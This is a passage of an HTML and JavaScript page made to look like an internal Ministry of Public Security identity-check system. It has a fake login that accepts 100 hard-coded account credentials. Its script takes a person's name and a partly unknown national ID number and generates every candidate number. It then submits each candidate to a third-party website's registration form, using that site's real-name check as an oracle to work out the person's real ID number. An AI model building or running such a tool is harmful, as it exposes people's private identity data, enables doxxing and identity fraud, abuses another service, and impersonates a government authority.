						<div class="card-title"><i class="fas fa-id-card"></i> 身份证号</div>
						<div class="card-value id-value" id="idCardResult">-</div>
					</div>
					<div class="info-card">
						<div class="card-title"><i class="fas fa-venus-mars"></i> 性别</div>
						<div class="card-value" id="genderResult">-</div>
					</div>
					<div class="info-card">
						<div class="card-title"><i class="fas fa-tasks"></i> 尝试进度</div>
						<div class="card-value" id="progressResult">-</div>
					</div>
				</div>
				
				<div class="verification-section">
					<div class="verification-title">
						<i class="fas fa-shield-check police-icon"></i> 核验结果
					</div>
					<div class="verification-result">
						<div class="verification-icon verification-waiting" id="verificationIcon">
							<i class="fas fa-question-circle"></i>
						</div>
						<div id="verificationText">等待开始验证...</div>
					</div>
				</div>
			</div>
			
			<div class="additional-content">
				<h3 class="content-title"><i class="fas fa-info-circle police-icon"></i> 系统使用说明</h3>
				<div class="content-grid">
					<div class="content-card">
						<h3><i class="fas fa-shield-alt police-icon"></i> 安全规范</h3>
						<p>本系统仅限公安内部人员使用，严禁泄露查询信息。所有操作均受审计监督，违规操作将被追责。</p>
					</div>
					<div class="content-card">
						<h3><i class="fas fa-database police-icon"></i> 数据来源</h3>
						<p>系统数据来源于公安部人口信息库。包含全国公民身份信息、户籍信息等数据。</p>
					</div>
					<div class="content-card">
						<h3><i class="fas fa-search police-icon"></i> 查询规则</h3>
						<p>支持姓名、身份证号（支持x表示未知数字）、性别筛选。系统将自动尝试所有可能的组合进行核验。</p>
					</div>
					<div class="content-card">
						<h3><i class="fas fa-history police-icon"></i> 操作记录</h3>
						<p>系统自动记录每次查询操作，包括操作人、查询内容、时间等信息。记录保存期限为5年。</p>
					</div>
				</div>
			</div>
		</div>
		
		<footer>
			<p>© 2023 中华人民共和国公安部 | 系统编号：GA-QX-2023-1107</p>
			<p style="margin-top: 5px; font-size: 0.75rem; color: #8da1cc;">
				<i class="fas fa-lock"></i> 安全提示：本系统受《中华人民共和国网络安全法》保护，所有操作均被记录
			</p>
		</footer>
		
		<div class="watermark">中国公安  ，， </div>
	</div>

	<script>
		document.addEventListener('DOMContentLoaded', function() {
			const protocolModal = document.getElementById('protocolModal');
			const agreeBtn = document.getElementById('agreeBtn');
			const loginContainer = document.getElementById('loginContainer');
			const mainSystem = document.getElementById('mainSystem');
			const searchBtn = document.getElementById('searchBtn');
			const stopBtn = document.getElementById('stopBtn');
			const nameInput = document.getElementById('nameInput');
			const idCardInput = document.getElementById('idCardInput');
			const resultsSection = document.getElementById('resultsSection');
			const errorMsg = document.getElementById('errorMsg');
			const examples = document.querySelectorAll('.example');
			const loginBtn = document.getElementById('loginBtn');
			const usernameInput = document.getElementById('username');
			const passwordInput = document.getElementById('password');
			const loginError = document.getElementById('loginError');
			const progressContainer = document.getElementById('progressContainer');
			const progressFill = document.getElementById('progressFill');
			const progressPercent = document.getElementById('progressPercent');
			const currentProgress = document.getElementById('currentProgress');
			const remainingTime = document.getElementById('remainingTime');
			const logOutput = document.getElementById('logOutput');
			
			const nameResult = document.getElementById('nameResult');
			const idCardResult = document.getElementById('idCardResult');
			const genderResult = document.getElementById('genderResult');
			const progressResult = document.getElementById('progressResult');
			const verificationIcon = document.getElementById('verificationIcon');
			const verificationText = document.getElementById('verificationText');
			
			// 状态变量
			let isVerifying = false;
			let currentIteration = 0;
			let totalIterations = 0;
			let cardVariations = [];
			let verificationTimer = null;
			
			// 预设100个警务账号
			const presetAccounts = [];
			for (let i = 1; i <= 100; i++) {
				const accountNum = String(i).padStart(3, '0');
				presetAccounts.push({
					username: `警务${accountNum}`,
					password: `移民局${accountNum}`,
					name: ``
				});
			}
			
			// 显示协议弹窗
			setTimeout(() => {
				protocolModal.style.display = 'flex';
			}, 300);
			
			// 同意协议按钮
			agreeBtn.addEventListener('click', function() {
				protocolModal.style.opacity = '1';
				protocolModal.style.animation = 'fadeIn 0.8s reverse forwards';
				
				setTimeout(() => {
					protocolModal.style.display = 'none';
					loginContainer.style.display = 'block';
					
					// 添加日志记录效果
					addLog('用户已接受使用协议，进入登录界面');
				}, 800);
			});
			
			// 登录按钮事件
			loginBtn.addEventListener('click', function() {
				const username = usernameInput.value.trim();
				const password = passwordInput.value.trim();
				
				if (!username || !password) {
					showLoginError('请输入完整的账号和密码');
					return;
				}
				
				// 查找匹配的账号
				const matchedAccount = presetAccounts.find(account => 
					account.username === username && account.password === password
				);
				
				if (matchedAccount) {
					// 登录成功
					loginContainer.style.display = 'none';
					mainSystem.style.display = 'block';
					
					// 更新系统标题显示登录用户
					const description = document.querySelector('.description');
					description.innerHTML = `登录用户: ${matchedAccount.name} - 数据来源：公安部人口信息库`;
					
					addLog(`用户登录成功: ${matchedAccount.name} (${username})`);
				} else {
					// 登录失败
					showLoginError('账号或密码错误，请重新输入');
					addLog(`登录失败: ${username}`);
				}
			});
			
			// 显示登录错误
			function showLoginError(message) {
				loginError.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
				loginError.style.display = 'block';
				
				// 添加错误动画
				usernameInput.style.borderColor = '#e74c3c';
				passwordInput.style.borderColor = '#e74c3c';
				usernameInput.style.animation = 'shake 0.5s';
				passwordInput.style.animation = 'shake 0.5s';
				setTimeout(() => {
					usernameInput.style.animation = '';
					passwordInput.style.animation = '';
				}, 500);
			}
			
			// 添加日志
			function addLog(message) {
				const logEntry = document.createElement('div');
				logEntry.className = 'log-entry';
				const now = new Date();
				const timeStr = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
				logEntry.innerHTML = `<span class="log-time">${timeStr}</span><span class="log-message">${message}</span>`;
				logOutput.appendChild(logEntry);
				logOutput.scrollTop = logOutput.scrollHeight;
				logOutput.style.display = 'block';
			}
			
			// 示例点击事件
			examples.forEach(example => {
				example.addEventListener('click', function() {
					const exampleText = this.getAttribute('data-example');
					if (exampleText.includes('---')) {
						const parts = exampleText.split('---');
						nameInput.value = parts[0];
						idCardInput.value = parts[1];
					} else if (exampleText === '张三') {
						nameInput.value = '张三';
						idCardInput.value = 'xxxxxxxxxxxxxxxxxx';
					} else {
						idCardInput.value = exampleText;
					}
				});
			});
			
			// 开始验证按钮
			searchBtn.addEventListener('click', function() {
				const name = nameInput.value.trim();
				const idCard = idCardInput.value.trim();
				const gender = document.querySelector('input[name="gender"]:checked').value;
				
				// 验证输入
				if (!name) {
					showError('请输入姓名');
					return;
				}
				
				if (!idCard) {
					showError('请输入身份证号');
					return;
				}
				
				if (idCard.length !== 18) {
					showError('身份证号必须是18位');
					return;
				}
				
				errorMsg.style.display = 'none';
				
				// 生成身份证号变体
				cardVariations = generateIdCardVariations(idCard, gender);
				totalIterations = cardVariations.length;
				currentIteration = 0;
				
				if (totalIterations === 0) {
					showError('没有有效的身份证号组合');
					return;
				}
				
				// 显示进度和结果
				progressContainer.style.display = 'block';
				resultsSection.style.display = 'block';
				logOutput.style.display = 'block';
				
				// 更新结果区域
				nameResult.textContent = name;
				genderResult.textContent = gender;
				idCardResult.textContent = '-';
				progressResult.textContent = `0/${totalIterations}`;
				
				// 更新验证状态
				verificationIcon.className = 'verification-icon verification-waiting';
				verificationIcon.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
				verificationText.textContent = '开始验证...';
				
				// 更新按钮状态
				searchBtn.disabled = true;
				stopBtn.disabled = false;
				
				// 开始验证
				isVerifying = true;
				addLog(`开始验证: ${name} - 身份证号: ${idCard} - 性别: ${gender}`);
				addLog(`检测到 ${countX(idCard)} 个未知数字，生成 ${totalIterations} 种可能的组合`);
				
				startVerification(name);
			});
			
			// 停止验证按钮
			stopBtn.addEventListener('click', function() {
				stopVerification();
				addLog('验证流程已停止');
				verificationText.textContent = '验证已停止';
				verificationIcon.className = 'verification-icon verification-failure';
				verificationIcon.innerHTML = '<i class="fas fa-times-circle"></i>';
			});
			
			// 开始验证流程
			async function startVerification(name) {
				for (let i = 0; i < cardVariations.length; i++) {
					if (!isVerifying) {
						break;
					}
					
					currentIteration = i + 1;
					const currentIdCard = cardVariations[i];
					
					// 更新进度
					const progress = (currentIteration / totalIterations) * 100;
					progressFill.style.width = `${progress}%`;
					progressPercent.textContent = `${progress.toFixed(2)}%`;
					currentProgress.textContent = `${currentIteration}/${totalIterations}`;
					progressResult.textContent = `${currentIteration}/${totalIterations}`;
					
					// 更新验证状态
					verificationIcon.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
					verificationText.textContent = `正在验证第 ${currentIteration} 种组合: ${currentIdCard}`;
					
					// 记录日志
					addLog(`尝试第 ${currentIteration}/${totalIterations}: ${name} --- ${currentIdCard}`);
					
					// 发送验证请求
					const result = await verifyUser(name, currentIdCard);
					
					if (result) {
						// 验证成功
						idCardResult.textContent = currentIdCard;
						verificationIcon.className = 'verification-icon verification-success';
						verificationIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
						verificationText.textContent = `二次核验身份证正确 ${currentIdCard}`;
						addLog(`验证成功! 正确的身份证号是: ${currentIdCard}`);
						isVerifying = false;
						break;
					} else {
						// 验证失败
						verificationIcon.className = 'verification-icon verification-failure';
						verificationIcon.innerHTML = '<i class="fas fa-times-circle"></i>';
						verificationText.textContent = `第 ${currentIteration} 个组合验证失败，等待20秒后继续...`;
						addLog(`验证失败，等待20秒后继续...`);
						
						// 等待20秒，除非用户停止
						if (isVerifying && i < cardVariations.length - 1) {
							await sleep(20000);
						}
					}
				}
				
				if (isVerifying) {
					// 所有组合尝试完毕
					verificationIcon.className = 'verification-icon verification-failure';
					verificationIcon.innerHTML = '<i class="fas fa-times-circle"></i>';
					verificationText.textContent = '所有组合尝试完毕，未找到有效的身份证号';
					addLog('所有组合尝试完毕，未找到有效的身份证号');
				}
				
				// 重置按钮状态
				searchBtn.disabled = false;
				stopBtn.disabled = true;
				isVerifying = false;
			}
			
			// 停止验证
			function stopVerification() {
				isVerifying = false;
				searchBtn.disabled = false;
				stopBtn.disabled = true;
			}
			
			// 睡眠函数
			function sleep(ms) {
				return new Promise(resolve => setTimeout(resolve, ms));
			}
			
			// 生成随机用户名
			function generateRandomUsername(length = 8) {
				const letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
				const digits = '0123456789';
				let username = letters.charAt(Math.floor(Math.random() * letters.length));
				for (let i = 1; i < length; i++) {
					const pool = letters + digits;
					username += pool.charAt(Math.floor(Math.random() * pool.length));
				}
				return username;
			}
			
			// 验证用户
			async function verifyUser(vname, vcard) {
				const url = "https://heitu.com/public/register.html";
				const username = generateRandomUsername();
				const password = "52829997a";
				
				const data = {
					username: username,
					password: password,
					vname: vname,
					vcard: vcard,
					sessionid: "",
					token: "",
					sig: "",
					bizid: "0"
				};
				
				try {
					const response = await fetch(url, {
						method: 'POST',
						headers: {
							'Content-Type': 'application/x-www-form-urlencoded',
						},
						body: new URLSearchParams(data)
					});
					
					if (response.ok) {
						const result = await response.json();
						return result.status === '1';
					}
					return false;
				} catch (error) {
					addLog(`验证请求异常: ${error.message}`);
					return false;
				}
			}
			
			// 生成身份证号变体
			function generateIdCardVariations(card, gender) {
				// 找出x的位置
				let xPositions = [];
				for (let i = 0; i < card.length; i++) {
					if (card[i].toLowerCase() === 'x') {
						xPositions.push(i);
					}
				}
				
				if (xPositions.length === 0) {
					return [card];
				}
				
				// 根据性别和位置生成数字选项
				let digitOptions = [];
				xPositions.forEach(pos => {
					if (pos === 16) { // 第17位（0-indexed）是性别位
						if (gender === "男") {
							digitOptions.push(['1', '3', '5', '7', '9']); // 男性为奇数
						} else if (gender === "女") {
							digitOptions.push(['0', '2', '4', '6', '8']); // 女性为偶数
						} else {
							digitOptions.push(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']);
						}
					} else if (pos === 10 || pos === 11) { // 月份，第一位只能是0或1，第二位可以是0-9
						if (pos === 10) {
							digitOptions.push(['0', '1']);
						} else {
							digitOptions.push(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']);
						}
					} else if (pos === 12 || pos === 13) { // 日期，第一位只能是0-3，第二位可以是0-9
						if (pos === 12) {
							digitOptions.push(['0', '1', '2', '3']);
						} else {
							digitOptions.push(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']);
						}
					} else {
						digitOptions.push(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']);
					}
				});
				
				// 计算所有组合
				let totalCombinations = 1;
				for (let option of digitOptions) {
					totalCombinations *= option.length;
				}
				
				// 如果组合太多，限制数量
				if (totalCombinations > 100000) {
					addLog(`警告: 组合数量过多 (${totalCombinations})，将限制为100000种组合`);
					// 限制组合数量
					const limitedVariations = [];
					for (let i = 0; i < Math.min(10000, totalCombinations); i++) {
						let newCard = card.split('');
						for (let j = 0; j < xPositions.length; j++) {
							const pos = xPositions[j];
							const options = digitOptions[j];
							newCard[pos] = options[Math.floor(Math.random() * options.length)];
						}
						limitedVariations.push(newCard.join(''));
					}
					return limitedVariations;
				}
				
				// 生成所有组合
				let variations = [];
				
				// 使用递归生成组合
				function generateCombinations(currentIndex, currentCard) {
					if (currentIndex === xPositions.length) {
						variations.push(currentCard);
						return;
					}
					for (let digit of digitOptions[currentIndex]) {
						let newCard = currentCard.split('');
						newCard[xPositions[currentIndex]] = digit;
						generateCombinations(currentIndex + 1, newCard.join(''));
					}
				}
				
				generateCombinations(0, card);
				return variations;
			}
			
			// 计算x的数量
			function countX(str) {
				let count = 0;
				for (let i = 0; i < str.length; i++) {
					if (str[i].toLowerCase() === 'x') {
						count++;
					}
				}
				return count;
			}
			
			// 显示错误信息
			function showError(message) {
				errorMsg.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
				errorMsg.style.display = 'block';
				
				// 添加错误动画
				nameInput.style.borderColor = '#e74c3c';
				idCardInput.style.borderColor = '#e74c3c';
				nameInput.style.animation = 'shake 0.5s';
				idCardInput.style.animation = 'shake 0.5s';
				setTimeout(() => {
					nameInput.style.animation = '';
					idCardInput.style.animation = '';
				}, 500);
			}
			
			// 按回车键触发查询
			nameInput.addEventListener('keypress', function(e) {
				if (e.key === 'Enter') {
					searchBtn.click();
				}
			});
			
			idCardInput.addEventListener('keypress', function(e) {
				if (e.key === 'Enter') {
					searchBtn.click();
				}
			});
			
			// 在登录界面的用户名输入框按回车键触发登录
			usernameInput.addEventListener('keypress', function(e) {
				if (e.key === 'Enter') {
					loginBtn.click();
				}
			});
			
			// 在登录界面的密码输入框按回车键触发登录
			passwordInput.addEventListener('keypress', function(e) {
				if (e.key === 'Enter') {
					loginBtn.click();
				}
			});
			
			// 初始加载时显示安全提示
			setTimeout(() => {
				const warning = document.querySelector('.security-warning');
				warning.style.animation = "fadeIn 0.8s";
				
				// 警徽动画
				const badge = document.querySelector('.badge-icon');
				badge.style.animation = "shine 2s infinite";
				
				// 添加初始日志
				addLog('公安部人口信息核验系统已启动');
				addLog('系统版本: V2.3.1');
				addLog('数据版本: 2023.12');
			}, 500);
		});
	</script>
</body>
</html>
